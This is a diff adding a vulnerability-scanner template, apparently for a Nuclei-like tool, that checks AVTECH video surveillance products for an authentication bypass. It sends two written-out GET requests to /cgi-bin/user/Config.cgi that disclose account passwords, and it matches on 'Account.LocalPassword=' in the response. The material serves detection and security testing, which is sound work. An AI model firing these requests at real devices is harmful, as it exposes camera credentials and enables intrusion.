@@ -1,0 +1,32 @@
+id: avtech-auth-bypass
+brief:
+    title: AVTECH Video Surveillance Product - Authentication Bypass
+    by: ritikchaddha
+    level: high
+    about: AVTECH Video Surveillance Products password disclosure through /cgi-bin/user/Config.cgi.
+    label:
+        - exposure
+        - avtech
+        - auth-bypass
+        - password
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*'
+        - '{{BaseURL}}/cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.*'
+      signs:
+        - "on": word
+          has:
+            - Account.Maxuser=
+            - Account.LocalPassword=
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/plain
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
